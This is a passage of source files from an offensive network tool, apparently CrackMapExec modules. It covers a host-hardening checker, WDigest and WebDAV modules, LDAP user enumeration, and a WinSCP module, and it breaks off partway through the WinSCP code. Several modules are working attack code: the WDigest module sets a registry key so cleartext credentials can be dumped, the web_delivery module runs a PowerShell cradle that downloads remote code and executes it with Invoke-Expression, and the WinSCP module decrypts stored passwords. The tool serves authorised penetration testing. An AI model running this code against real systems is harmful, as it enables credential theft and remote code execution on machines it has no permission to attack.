      name = user_info[\'UserName\']\n        ok = name not in (\'Administrator\', \'Administrateur\')\n        reasons = [f\'Administrator name changed to {name}\' if ok else \'Administrator name unchanged\']\n        return ok, reasons\n\n    def check_guest_account_disabled(self):\n        user_info = self.get_user_info(self.connection, rid=501)\n        uac = user_info[\'UserAccountControl\']\n        disabled = bool(uac & samr.USER_ACCOUNT_DISABLED)\n        reasons = [\'Guest account disabled\' if disabled else \'Guest account enabled\']\n        return disabled, reasons\n\n    def check_spooler_service(self):\n        ok = False\n        service_config, service_status = self.get_service(\'Spooler\', self.connection)\n        if service_config[\'dwStartType\'] == scmr.SERVICE_DISABLED:\n            ok = True\n            reasons = [\'Spooler service disabled\']\n        else:\n            reasons = [\'Spooler service enabled\']\n            if service_status == scmr.SERVICE_RUNNING:\n                reasons.append(\'Spooler service running\')\n            elif service_status == scmr.SERVICE_STOPPED:\n                ok = True\n                reasons.append(\'Spooler service not running\')\n\n        return ok, reasons\n\n    def check_wsus_running(self):\n        ok = True\n        reasons = []\n        service_config, service_status = self.get_service(\'wuauserv\', self.connection)\n        if service_config[\'dwStartType\'] == scmr.SERVICE_DISABLED:\n            reasons = [\'WSUS service disabled\']\n        elif service_status != scmr.SERVICE_RUNNING:\n            reasons = [\'WSUS service not running\']\n        return ok, reasons\n\n    def check_nbtns(self):\n        key_name = \'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\NetBT\\\\Parameters\\\\Interfaces\'\n        subkeys = self.reg_get_subkeys(self.dce, self.connection, key_name)\n        success = False\n        reasons = []\n        missing = 0\n        nbtns_enabled = 0\n        for subkey in subkeys:\n            value = self.reg_query_value(self.dce, self.connection, key_name + \'\\\\\' + subkey, \'NetbiosOptions\')\n            if type(value) == DCERPCSessionError:\n                if value.error_code == ERROR_OBJECT_NOT_FOUND:\n                    missing += 1\n                continue\n            if value != 2:\n                nbtns_enabled += 1\n        if missing > 0:\n            reasons.append(f\'HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\NetBT\\\\Parameters\\\\Interfaces\\\\<interface>\\\\NetbiosOption: value not found on {missing} interfaces\')\n        if nbtns_enabled > 0:\n            reasons.append(f\'NBTNS enabled on {nbtns_enabled} interfaces out of {len(subkeys)}\')\n        if missing == 0 and nbtns_enabled == 0:\n            success = True\n            reasons.append(\'NBTNS disabled on all interfaces\')\n        return success, reasons\n\n    def check_applocker(self):\n        key_name = \'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\SrpV2\'\n        subkeys = self.reg_get_subkeys(self.dce, self.connection, key_name)\n        rule_count = 0\n        for collection in subkeys:\n            collection_key_name = key_name + \'\\\\\' + collection\n            rules = self.reg_get_subkeys(self.dce, self.connection, collection_key_name)\n            rule_count += len(rules)\n        success = rule_count > 0\n        reasons = [f\'Found {rule_count} AppLocker rules defined\']\n\n        return success, reasons\n\n    # Methods for getting values from the remote registry #\n    #######################################################\n\n    def _open_root_key(self, dce, connection, root_key):\n        ans = None\n        retries = 1\n        opener = {\n            \'HKLM\':rrp.hOpenLocalMachine,\n            \'HKCR\':rrp.hOpenClassesRoot,\n            \'HKU\':rrp.hOpenUsers,\n            \'HKCU\':rrp.hOpenCurrentUser,\n            \'HKCC\':rrp.hOpenCurrentConfig\n        }\n\n        while retries > 0:\n            try:\n                ans = opener[root_key.upper()](dce)\n                break\n            except KeyError:\n                self.context.log.error(f\'HostChecker._open_root_key():{connection.host}: Invalid root key. Must be one of HKCR, HKCC, HKCU, HKLM or HKU\')\n                break\n            except Exception as e:\n                self.context.log.error(f\'HostChecker._open_root_key():{connection.host}: Error while trying to open {root_key.upper()}: {e}\')\n                if \'Broken pipe\' in e.args:\n                    self.context.log.error(\'Retrying\')\n                    retries -= 1\n        return ans\n\n    def reg_get_subkeys(self, dce, connection, key_name):\n        root_key, subkey = key_name.split(\'\\\\\', 1)\n        ans = self._open_root_key(dce, connection, root_key)\n        subkeys = []\n        if ans is None:\n            return subkeys\n\n        root_key_handle = ans[\'phKey\']\n        try:\n            ans = rrp.hBaseRegOpenKey(dce, root_key_handle, subkey)\n        except DCERPCSessionError as e:\n            if e.error_code != ERROR_FILE_NOT_FOUND:\n                self.context.log.error(f\'HostChecker.reg_get_subkeys(): Could not retrieve subkey {subkey}: {e}\\n\')\n            return subkeys\n        except Exception as e:\n            self.context.log.error(f\'HostChecker.reg_get_subkeys(): Error while trying to retrieve subkey {subkey}: {e}\\n\')\n            return subkeys\n\n        subkey_handle = ans[\'phkResult\']\n        i = 0\n        while True:\n            try:\n                ans = rrp.hBaseRegEnumKey(dce=dce, hKey=subkey_handle, dwIndex=i)\n                subkeys.append(ans[\'lpNameOut\'][:-1])\n                i += 1\n            except DCERPCSessionError as e:\n                break\n        return subkeys\n\n    def reg_query_value(self, dce, connection, keyName, valueName=None):\n        """"""\n        Query remote registry data for a given registry value\n        """"""\n        def subkey_values(subkey_handle):\n            dwIndex = 0\n            while True:\n                try:\n                    value_type, value_name, value_data = get_value(subkey_handle, dwIndex)\n                    yield (value_type, value_name, value_data)\n                    dwIndex += 1\n                except DCERPCSessionError as e:\n                    if e.error_code == ERROR_NO_MORE_ITEMS:\n                        break\n                    else:\n                        self.context.log.error(f\'HostChecker.reg_query_value()->sub_key_values(): Received error code {e.error_code}\')\n                        return\n\n        def get_value(subkey_handle, dwIndex=0):\n            ans = rrp.hBaseRegEnumValue(dce=dce, hKey=subkey_handle, dwIndex=dwIndex)\n            value_type = ans[\'lpType\']\n            value_name = ans[\'lpValueNameOut\']\n            value_data = ans[\'lpData\']\n\n            # Do any conversion necessary depending on the registry value type\n            if value_type in (\n                REG_VALUE_TYPE_UNICODE_STRING,\n                REG_VALUE_TYPE_UNICODE_STRING_WITH_ENV,\n                REG_VALUE_TYPE_UNICODE_STRING_SEQUENCE):\n                value_data = b\'\'.join(value_data).decode(\'utf-16\')\n            else:\n                value_data = b\'\'.join(value_data)\n                if value_type in (\n                    REG_VALUE_TYPE_32BIT_LE,\n                    REG_VALUE_TYPE_64BIT_LE):\n                    value_data = int.from_bytes(value_data, \'little\')\n                elif value_type == REG_VALUE_TYPE_32BIT_BE:\n                    value_data = int.from_bytes(value_data, \'big\')\n\n            return value_type, value_name[:-1], value_data\n\n        try:\n            root_key, subkey = keyName.split(\'\\\\\', 1)\n        except ValueError:\n            self.context.log.error(f\'HostChecker.reg_query_value(): Could not split keyname {keyName}\')\n            return\n\n        ans = self._open_root_key(dce, connection, root_key)\n        if ans is None:\n            return ans\n\n        root_key_handle = ans[\'phKey\']\n        try:\n            ans = rrp.hBaseRegOpenKey(dce, root_key_handle, subkey)\n        except DCERPCSessionError as e:\n            if e.error_code == ERROR_FILE_NOT_FOUND:\n                return e\n\n        subkey_handle = ans[\'phkResult\']\n\n        if valueName is None:\n            _,_, data = get_value(subkey_handle)\n        else:\n            found = False\n            for _,name,data in subkey_values(subkey_handle):\n                if name.upper() == valueName.upper():\n                    found = True\n                    break\n            if not found:\n                return DCERPCSessionError(error_code=ERROR_OBJECT_NOT_FOUND)\n        return data\n\n    # Methods for getting values from SAMR and SCM #\n    ################################################\n\n    def get_service(self, service_name, connection):\n        """"""\n        Get the service status and configuration for specified service\n        """"""\n        remoteOps = RemoteOperations(smbConnection=connection.conn, doKerberos=False)\n        machine_name,_ = remoteOps.getMachineNameAndDomain()\n        remoteOps._RemoteOperations__connectSvcCtl()\n        dce = remoteOps._RemoteOperations__scmr\n        scm_handle = scmr.hROpenSCManagerW(dce, machine_name)[\'lpScHandle\']\n        service_handle = scmr.hROpenServiceW(dce, scm_handle, service_name)[\'lpServiceHandle\']\n        service_config = scmr.hRQueryServiceConfigW(dce, service_handle)[\'lpServiceConfig\']\n        service_status = scmr.hRQueryServiceStatus(dce, service_handle)[\'lpServiceStatus\'][\'dwCurrentState\']\n        remoteOps.finish()\n\n        return service_config, service_status\n\n    def get_user_info(self, connection, rid=501):\n        """"""\n        Get user information for the user with the specified RID\n        """"""\n        remoteOps = RemoteOperations(smbConnection=connection.conn, doKerberos=False)\n        machine_name, domain_name = remoteOps.getMachineNameAndDomain()\n\n        try:\n            remoteOps.connectSamr(machine_name)\n        except samr.DCERPCSessionError:\n            # If connecting to machine_name didn\'t work, it\'s probably because\n            # we\'re dealing with a domain controller, so we need to use the\n            # actual domain name instead of the machine name, because DCs don\'t\n            # use the SAM\n            remoteOps.connectSamr(domain_name)\n\n        dce = remoteOps._RemoteOperations__samr\n        domain_handle = remoteOps._RemoteOperations__domainHandle\n        user_handle = samr.hSamrOpenUser(dce, domain_handle, userId=rid)[\'UserHandle\']\n        user_info = samr.hSamrQueryInformationUser2(dce, user_handle, samr.USER_INFORMATION_CLASS.UserAllInformation)\n        user_info = user_info[\'Buffer\'][\'All\']\n        remoteOps.finish()\n        return user_info\n\n    def ls(self, smb, path=\'\\\\\', share=\'C$\'):\n        l = []\n        try:\n            l = smb.conn.listPath(share, path)\n        except SMBSessionError as e:\n            if e.getErrorString()[0] not in (\'STATUS_NO_SUCH_FILE\', \'STATUS_OBJECT_NAME_NOT_FOUND\'):\n                self.context.log.error(f\'ls(): C:\\\\{path} {e.getErrorString()}\')\n        except Exception as e:\n                self.context.log.error(f\'ls(): C:\\\\{path} {e}\\n\')\n        return l\n\n# Comparison operators #\n########################\n\ndef le(reg_sz_string, number):\n    return int(reg_sz_string[:-1]) <= number\n\ndef in_(obj, seq):\n    return obj in seq\n\ndef startswith(string, start):\n    return string.startswith(start)\n\ndef not_(boolean_operator):\n    def wrapper(*args, **kwargs):\n        return not boolean_operator(*args, **kwargs)\n    wrapper.__name__ = f\'not_{boolean_operator.__name__}\'\n    return wrapper\n', 'wdigest.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.dcerpc.v5 import rrp\nfrom impacket.examples.secretsdump import RemoteOperations\nfrom sys import exit\n\nclass CMEModule:\n\n    name = ""wdigest""\n    description = ""Creates/Deletes the \'UseLogonCredential\' registry key enabling WDigest cred dumping on Windows >= 8.1""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        ACTION  Create/Delete the registry key (choices: enable, disable, check)\n        """"""\n\n        if not ""ACTION"" in module_options:\n            context.log.fail(""ACTION option not specified!"")\n            exit(1)\n\n        if module_options[""ACTION""].lower() not in [""enable"", ""disable"", ""check""]:\n            context.log.fail(""Invalid value for ACTION option!"")\n            exit(1)\n\n        self.action = module_options[""ACTION""].lower()\n\n    def on_admin_login(self, context, connection):\n        if self.action == ""enable"":\n            self.wdigest_enable(context, connection.conn)\n        elif self.action == ""disable"":\n            self.wdigest_disable(context, connection.conn)\n        elif self.action == ""check"":\n            self.wdigest_check(context, connection.conn)\n\n    def wdigest_enable(self, context, smbconnection):\n        remoteOps = RemoteOperations(smbconnection, False)\n        remoteOps.enableRegistry()\n\n        if remoteOps._RemoteOperations__rrp:\n            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            ans = rrp.hBaseRegOpenKey(\n                remoteOps._RemoteOperations__rrp,\n                regHandle,\n                ""SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest"",\n            )\n            keyHandle = ans[""phkResult""]\n\n            rrp.hBaseRegSetValue(\n                remoteOps._RemoteOperations__rrp,\n                keyHandle,\n                ""UseLogonCredential\\x00"",\n                rrp.REG_DWORD,\n                1,\n            )\n\n            rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""UseLogonCredential\\x00"")\n\n            if int(data) == 1:\n                context.log.success(""UseLogonCredential registry key created successfully"")\n\n        try:\n            remoteOps.finish()\n        except:\n            pass\n\n    def wdigest_disable(self, context, smbconnection):\n        remoteOps = RemoteOperations(smbconnection, False)\n        remoteOps.enableRegistry()\n\n        if remoteOps._RemoteOperations__rrp:\n            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            ans = rrp.hBaseRegOpenKey(\n                remoteOps._RemoteOperations__rrp,\n                regHandle,\n                ""SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest"",\n            )\n            keyHandle = ans[""phkResult""]\n\n            try:\n                rrp.hBaseRegDeleteValue(\n                    remoteOps._RemoteOperations__rrp,\n                    keyHandle,\n                    ""UseLogonCredential\\x00"",\n                )\n            except:\n                context.log.success(""UseLogonCredential registry key not present"")\n\n                try:\n                    remoteOps.finish()\n                except:\n                    pass\n\n                return\n\n            try:\n                # Check to make sure the reg key is actually deleted\n                rtype, data = rrp.hBaseRegQueryValue(\n                    remoteOps._RemoteOperations__rrp,\n                    keyHandle,\n                    ""UseLogonCredential\\x00"",\n                )\n            except DCERPCException:\n                context.log.success(""UseLogonCredential registry key deleted successfully"")\n\n                try:\n                    remoteOps.finish()\n                except:\n                    pass\n\n    def wdigest_check(self, context, smbconnection):\n        remoteOps = RemoteOperations(smbconnection, False)\n        remoteOps.enableRegistry()\n\n        if remoteOps._RemoteOperations__rrp:\n            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, ""SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest"")\n            keyHandle = ans[""phkResult""]\n\n            try:\n                rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""UseLogonCredential\\x00"")\n                if int(data) == 1:\n                    context.log.success(""UseLogonCredential registry key is enabled"")\n                else:\n                    context.log.fail(""Unexpected registry value for UseLogonCredential: %s"" % data)\n            except DCERPCException as d:\n                if ""winreg.HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest"" in str(d):\n                    context.log.fail(""UseLogonCredential registry key is disabled (registry key not found)"")\n                else:\n                    context.log.fail(""UseLogonCredential registry key not present"")\n            try:\n                remoteOps.finish()\n            except:\n                pass', 'web_delivery.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom sys import exit\n\n\nclass CMEModule:\n    """"""\n    Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module\n    Reference: https://github.com/EmpireProject/Empire/blob/2.0_beta/data/module_source/code_execution/Invoke-MetasploitPayload.ps1\n\n    Module by @byt3bl33d3r\n    """"""\n\n    name = ""web_delivery""\n    description = ""Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module""\n    supported_protocols = [""smb"", ""mssql""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        URL  URL for the download cradle\n        PAYLOAD  Payload architecture (choices: 64 or 32) Default: 64\n        """"""\n\n        if not ""URL"" in module_options:\n            context.log.fail(""URL option is required!"")\n            exit(1)\n\n        self.url = module_options[""URL""]\n\n        self.payload = ""64""\n        if ""PAYLOAD"" in module_options:\n            if module_options[""PAYLOAD""] not in [""64"", ""32""]:\n                context.log.fail(""Invalid value for PAYLOAD option!"")\n                exit(1)\n            self.payload = module_options[""PAYLOAD""]\n\n    def on_admin_login(self, context, connection):\n        ps_command = """"""[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring(\'{}\');"""""".format(self.url)\n        if self.payload == ""32"":\n            connection.ps_execute(ps_command, force_ps32=True)\n        else:\n            connection.ps_execute(ps_command, force_ps32=False)\n        context.log.success(""Executed web-delivery launcher"")\n', 'webdav.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\nfrom cme.protocols.smb.remotefile import RemoteFile\nfrom impacket import nt_errors\nfrom impacket.smb3structs import FILE_READ_DATA\nfrom impacket.smbconnection import SessionError\n\n\nclass CMEModule:\n    """"""\n    Enumerate whether the WebClient service is running on the target by looking for the\n    DAV RPC Service pipe. This technique was first suggested by Lee Christensen (@tifkin_)\n\n    Module by Tobias Neitzel (@qtc_de)\n    """"""\n\n    name = ""webdav""\n    description = ""Checks whether the WebClient service is running on the target""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        MSG     Info message when the WebClient service is running. \'{}\' is replaced by the target.\n        """"""\n        self.output = ""WebClient Service enabled on: {}""\n\n        if ""MSG"" in module_options:\n            self.output = module_options[""MSG""]\n\n    def on_login(self, context, connection):\n        """"""\n        Check whether the \'DAV RPC Service\' pipe exists within the \'IPC$\' share. This indicates\n        that the WebClient service is running on the target.\n        """"""\n        try:\n            remote_file = RemoteFile(connection.conn, ""DAV RPC Service"", ""IPC$"", access=FILE_READ_DATA)\n\n            remote_file.open()\n            remote_file.close()\n\n            context.log.highlight(self.output.format(connection.conn.getRemoteHost()))\n\n        except SessionError as e:\n            if e.getErrorCode() == nt_errors.STATUS_OBJECT_NAME_NOT_FOUND:\n                pass\n\n            else:\n                raise e\n', 'whoami.py': 'class CMEModule:\n    """"""\n    Basic enumeration of provided user information and privileges\n    Module by spyr0 (@spyr0-sec)\n    """"""\n\n    name = ""whoami""\n    description = ""Get details of provided user""\n    supported_protocols = [""ldap""]\n    opsec_safe = True  # Does the module touch disk?\n    multiple_hosts = True  # Does it make sense to run this module on multiple hosts at a time?\n\n    def options(self, context, module_options):\n        """"""\n        USER  Enumerate information about a different SamAccountName\n        """"""\n        self.username = None\n        if ""USER"" in module_options:\n            self.username = module_options[""USER""]\n\n    def on_login(self, context, connection):\n        searchBase = connection.ldapConnection._baseDN\n        if self.username is None:\n            searchFilter = f""(sAMAccountName={connection.username})""\n        else:\n            searchFilter = f""(sAMAccountName={format(self.username)})""\n\n        context.log.debug(f""Using naming context: {searchBase} and {searchFilter} as search filter"")\n\n        # Get attributes of provided user\n        r = connection.ldapConnection.search(\n            searchBase=searchBase,\n            searchFilter=searchFilter,\n            attributes=[\n                ""name"",\n                ""sAmAccountName"",\n                ""description"",\n                ""distinguishedName"",\n                ""pwdLastSet"",\n                ""logonCount"",\n                ""lastLogon"",\n                ""userAccountControl"",\n                ""servicePrincipalName"",\n                ""memberOf"",\n            ],\n            sizeLimit=999,\n        )\n        for response in r[0][""attributes""]:\n            if ""userAccountControl"" in str(response[""type""]):\n                if str(response[""vals""][0]) == ""512"":\n                    context.log.highlight(f""Enabled: Yes"")\n                    context.log.highlight(f""Password Never Expires: No"")\n                elif str(response[""vals""][0]) == ""514"":\n                    context.log.highlight(f""Enabled: No"")\n                    context.log.highlight(f""Password Never Expires: No"")\n                elif str(response[""vals""][0]) == ""66048"":\n                    context.log.highlight(f""Enabled: Yes"")\n                    context.log.highlight(f""Password Never Expires: Yes"")\n                elif str(response[""vals""][0]) == ""66050"":\n                    context.log.highlight(f""Enabled: No"")\n                    context.log.highlight(f""Password Never Expires: Yes"")\n            elif ""lastLogon"" in str(response[""type""]):\n                if str(response[""vals""][0]) == ""1601"":\n                    context.log.highlight(f""Last logon: Never"")\n                else:\n                    context.log.highlight(f""Last logon: {response[\'vals\'][0]}"")\n            elif ""memberOf"" in str(response[""type""]):\n                for group in response[""vals""]:\n                    context.log.highlight(f""Member of: {group}"")\n            elif ""servicePrincipalName"" in str(response[""type""]):\n                context.log.highlight(f""Service Account Name(s) found - Potentially Kerberoastable user!"")\n                for spn in response[""vals""]:\n                    context.log.highlight(f""Service Account Name: {spn}"")\n            else:\n                context.log.highlight(response[""type""] + "": "" + response[""vals""][0])\n', 'winscp_dump.py': '#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# If you are looking for a local Version, the baseline code is from https://github.com/NeffIsBack/WinSCPPasswdExtractor\n# References and inspiration:\n# - https://github.com/anoopengineer/winscppasswd\n# - https://github.com/dzxs/winscppassword\n# - https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb\n\nimport traceback\nfrom typing import Tuple\nfrom impacket.dcerpc.v5.rpcrt import DCERPCException\nfrom impacket.dcerpc.v5 import rrp\nfrom impacket.examples.secretsdump import RemoteOperations\nfrom urllib.parse import unquote\nfrom io import BytesIO\nimport re\nimport configparser\n\n\nclass CMEModule:\n    """"""\n    Module by @NeffIsBack\n    """"""\n\n    name = ""winscp""\n    description = ""Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.""\n    supported_protocols = [""smb""]\n    opsec_safe = True\n    multiple_hosts = True\n\n    def options(self, context, module_options):\n        """"""\n        PATH        Specify the Path if you already found a WinSCP.ini file. (Example: PATH=""C:\\\\Users\\\\USERNAME\\\\Documents\\\\WinSCP_Passwords\\\\WinSCP.ini"")\n\n        REQUIRES ADMIN PRIVILEGES:\n        As Default the script looks into the registry and searches for WinSCP.ini files in\n            \\""C:\\\\Users\\\\{USERNAME}\\\\Documents\\\\WinSCP.ini\\"" and in\n            \\""C:\\\\Users\\\\{USERNAME}\\\\AppData\\\\Roaming\\\\WinSCP.ini\\"",\n            for every user found on the System.\n        """"""\n        if ""PATH"" in module_options:\n            self.filepath = module_options[""PATH""]\n        else:\n            self.filepath = """"\n\n        self.PW_MAGIC = 0xA3\n        self.PW_FLAG = 0xFF\n        self.share = ""C$""\n        self.userDict = {}\n\n    # ==================== Helper ====================\n    def printCreds(self, context, session):\n        if type(session) is str:\n            context.log.fail(session)\n        else:\n            context.log.highlight(""======={s}======="".format(s=session[0]))\n            context.log.highlight(""HostName: {s}"".format(s=session[1]))\n            context.log.highlight(""UserName: {s}"".format(s=session[2]))\n            context.log.highlight(""Password: {s}"".format(s=session[3]))\n\n    def userObjectToNameMapper(self, context, connection, allUserObjects):\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            for userObject in allUserObjects:\n                ans = rrp.hBaseRegOpenKey(\n                    remoteOps._RemoteOperations__rrp,\n                    regHandle,\n                    ""SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\ProfileList\\\\"" + userObject,\n                )\n                keyHandle = ans[""phkResult""]\n\n                userProfilePath = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""ProfileImagePath"")[1].split(""\\x00"")[:-1][0]\n                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n                self.userDict[userObject] = userProfilePath.split(""\\\\"")[-1]\n        finally:\n            remoteOps.finish()\n\n    # ==================== Decrypt Password ====================\n    def decryptPasswd(self, host: str, username: str, password: str) -> str:\n        key = username + host\n\n        # transform password to bytes\n        passBytes = []\n        for i in range(len(password)):\n            val = int(password[i], 16)\n            passBytes.append(val)\n\n        pwFlag, passBytes = self.dec_next_char(passBytes)\n        pwLength = 0\n\n        # extract password length and trim the passbytes\n        if pwFlag == self.PW_FLAG:\n            _, passBytes = self.dec_next_char(passBytes)\n            pwLength, passBytes = self.dec_next_char(passBytes)\n        else:\n            pwLength = pwFlag\n        to_be_deleted, passBytes = self.dec_next_char(passBytes)\n        passBytes = passBytes[to_be_deleted * 2 :]\n\n        # decrypt the password\n        clearpass = """"\n        for i in range(pwLength):\n            val, passBytes = self.dec_next_char(passBytes)\n            clearpass += chr(val)\n        if pwFlag == self.PW_FLAG:\n            clearpass = clearpass[len(key) :]\n        return clearpass\n\n    def dec_next_char(self, passBytes) -> ""Tuple[int, bytes]"":\n        """"""\n        Decrypts the first byte of the password and returns the decrypted byte and the remaining bytes.\n        Parameters\n        ----------\n        passBytes : bytes\n            The password bytes\n        """"""\n        if not passBytes:\n            return 0, passBytes\n        a = passBytes[0]\n        b = passBytes[1]\n        passBytes = passBytes[2:]\n        return ~(((a << 4) + b) ^ self.PW_MAGIC) & 0xFF, passBytes\n\n    # ==================== Handle Registry ====================\n    def registrySessionExtractor(self, context, connection, userObject, sessionName):\n        """"""\n        Extract Session information from registry\n        """"""\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            ans = rrp.hBaseRegOpenKey(\n                remoteOps._RemoteOperations__rrp,\n                regHandle,\n                userObject + ""\\\\Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\\\\"" + sessionName,\n            )\n            keyHandle = ans[""phkResult""]\n\n            hostName = unquote(rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""HostName"")[1].split(""\\x00"")[:-1][0])\n            userName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""UserName"")[1].split(""\\x00"")[:-1][0]\n            try:\n                password = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""Password"")[1].split(""\\x00"")[:-1][0]\n            except:\n                context.log.debug(""Session found but no Password is stored!"")\n                password = """"\n\n            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n\n            if password:\n                decPassword = self.decryptPasswd(hostName, userName, password)\n            else:\n                decPassword = ""NO_PASSWORD_FOUND""\n            sectionName = unquote(sessionName)\n            return [sectionName, hostName, userName, decPassword]\n        except Exception as e:\n            context.log.fail(f""Error in Session Extraction: {e}"")\n            context.log.debug(traceback.format_exc())\n        finally:\n            remoteOps.finish()\n        return ""ERROR IN SESSION EXTRACTION""\n\n    def findAllLoggedInUsersInRegistry(self, context, connection):\n        """"""\n        Checks whether User already exist in registry and therefore are logged in\n        """"""\n        userObjects = []\n\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            # Enumerate all logged in and loaded Users on System\n            ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, """")\n            keyHandle = ans[""phkResult""]\n\n            data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)\n            users = data[""lpcSubKeys""]\n\n            # Get User Names\n            userNames = []\n            for i in range(users):\n                userNames.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)[""lpNameOut""].split(""\\x00"")[:-1][0])\n            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n\n            # Filter legit users in regex\n            userNames.remove("".DEFAULT"")\n            regex = re.compile(r""^.*_Classes$"")\n            userObjects = [i for i in userNames if not regex.match(i)]\n        except Exception as e:\n            context.log.fail(f""Error handling Users in registry: {e}"")\n            context.log.debug(traceback.format_exc())\n        finally:\n            remoteOps.finish()\n        return userObjects\n\n    def findAllUsers(self, context, connection):\n        """"""\n        Find all User on the System in HKEY_LOCAL_MACHINE\n        """"""\n        userObjects = []\n\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            # Enumerate all Users on System\n            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)\n            regHandle = ans[""phKey""]\n\n            ans = rrp.hBaseRegOpenKey(\n                remoteOps._RemoteOperations__rrp,\n                regHandle,\n                ""SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\ProfileList"",\n            )\n            keyHandle = ans[""phkResult""]\n\n            data = rrp.hBaseRegQueryInfoKey(remoteOps._RemoteOperations__rrp, keyHandle)\n            users = data[""lpcSubKeys""]\n\n            # Get User Names\n            for i in range(users):\n                userObjects.append(rrp.hBaseRegEnumKey(remoteOps._RemoteOperations__rrp, keyHandle, i)[""lpNameOut""].split(""\\x00"")[:-1][0])\n            rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n        except Exception as e:\n            context.log.fail(f""Error handling Users in registry: {e}"")\n            context.log.debug(traceback.format_exc())\n        finally:\n            remoteOps.finish()\n        return userObjects\n\n    def loadMissingUsers(self, context, connection, unloadedUserObjects):\n        """"""\n        Extract Information for not logged in Users and then loads them into registry.\n        """"""\n        try:\n            remoteOps = RemoteOperations(connection.conn, False)\n            remoteOps.enableRegistry()\n\n            for userObject in unloadedUserObjects:\n                # Extract profile Path of NTUSER.DAT\n                ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)\n                regHandle = ans[""phKey""]\n\n                ans = rrp.hBaseRegOpenKey(\n                    remoteOps._RemoteOperations__rrp,\n                    regHandle,\n                    ""SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\ProfileList\\\\"" + userObject,\n                )\n                keyHandle = ans[""phkResult""]\n\n                userProfilePath = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, ""ProfileImagePath"")[1].split(""\\x00"")[:-1][0]\n                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n\n                # Load Profile\n                ans = rrp.hOpenUsers(remoteOps._RemoteOperations__rrp)\n                regHandle = ans[""phKey""]\n\n                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, """")\n                keyHandle = ans[""phkResult""]\n\n                context.log.debug(""LOAD USER INTO REGISTRY: "" + userObject)\n                rrp.hBaseRegLoadKey(\n                    remoteOps._RemoteOperations__rrp,\n                    keyHandle,\n                    userObject,\n                    userProfilePath + ""\\\\"" + ""NTUSER.DAT"",\n                )\n                rrp.hBaseRegCloseKey(remoteOps._RemoteOperations__rrp, keyHandle)\n        finally:\n            remoteOps.finish()\n\n    def 